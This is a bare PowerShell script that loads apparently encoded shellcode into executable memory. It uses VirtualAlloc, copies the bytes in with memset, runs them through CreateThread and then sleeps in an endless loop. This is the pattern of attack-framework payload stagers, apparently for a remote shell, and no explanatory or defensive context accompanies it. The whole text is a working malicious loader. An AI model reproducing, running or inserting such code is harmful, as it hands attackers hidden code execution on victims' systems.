$wV3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $wV3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xeb,0xea,0x96,0x51,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x53,0x13,0x03,0x53,0x13,0x83,0xeb,0x17,0x08,0x63,0xad,0x0f,0x4f,0x8c,0x4e,0xcf,0x30,0x04,0xab,0xfe,0x70,0x72,0xbf,0x50,0x41,0xf0,0xed,0x5c,0x2a,0x54,0x06,0xd7,0x5e,0x71,0x29,0x50,0xd4,0xa7,0x04,0x61,0x45,0x9b,0x07,0xe1,0x94,0xc8,0xe7,0xd8,0x56,0x1d,0xe9,0x1d,0x8a,0xec,0xbb,0xf6,0xc0,0x43,0x2c,0x73,0x9c,0x5f,0xc7,0xcf,0x30,0xd8,0x34,0x87,0x33,0xc9,0xea,0x9c,0x6d,0xc9,0x0d,0x71,0x06,0x40,0x16,0x96,0x23,0x1a,0xad,0x6c,0xdf,0x9d,0x67,0xbd,0x20,0x31,0x46,0x72,0xd3,0x4b,0x8e,0xb4,0x0c,0x3e,0xe6,0xc7,0xb1,0x39,0x3d,0xba,0x6d,0xcf,0xa6,0x1c,0xe5,0x77,0x03,0x9d,0x2a,0xe1,0xc0,0x91,0x87,0x65,0x8e,0xb5,0x16,0xa9,0xa4,0xc1,0x93,0x4c,0x6b,0x40,0xe7,0x6a,0xaf,0x09,0xb3,0x13,0xf6,0xf7,0x12,0x2b,0xe8,0x58,0xca,0x89,0x62,0x74,0x1f,0xa0,0x28,0x10,0xec,0x89,0xd2,0xe0,0x7a,0x99,0xa1,0xd2,0x25,0x31,0x2e,0x5e,0xad,0x9f,0xa9,0xa1,0x84,0x58,0x25,0x5c,0x27,0x99,0x6f,0x9a,0x73,0xc9,0x07,0x0b,0xfc,0x82,0xd7,0xb4,0x29,0x3e,0xdd,0x22,0x12,0x17,0xdc,0xb1,0xfa,0x6a,0xdf,0xa4,0xa6,0xe3,0x39,0x96,0x06,0xa4,0x95,0x56,0xf7,0x04,0x46,0x3e,0x1d,0x8b,0xb9,0x5e,0x1e,0x41,0xd2,0xf4,0xf1,0x3c,0x8a,0x60,0x6b,0x65,0x40,0x11,0x74,0xb3,0x2c,0x11,0xfe,0x30,0xd0,0xdf,0xf7,0x3d,0xc2,0xb7,0xf7,0x0b,0xb8,0x11,0x07,0xa6,0xd7,0x9d,0x9d,0x4d,0x7e,0xca,0x09,0x4c,0xa7,0x3c,0x96,0xaf,0x82,0x37,0x1f,0x3a,0x6d,0x2f,0x60,0xaa,0x6d,0xaf,0x36,0xa0,0x6d,0xc7,0xee,0x90,0x3d,0xf2,0xf0,0x0c,0x52,0xaf,0x64,0xaf,0x03,0x1c,0x2e,0xc7,0xa9,0x7b,0x18,0x48,0x51,0xae,0x98,0xb4,0x84,0x96,0xee,0xd4,0x14;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ITO=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ITO.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ITO,0,0,0);for (;;){Start-sleep 60};
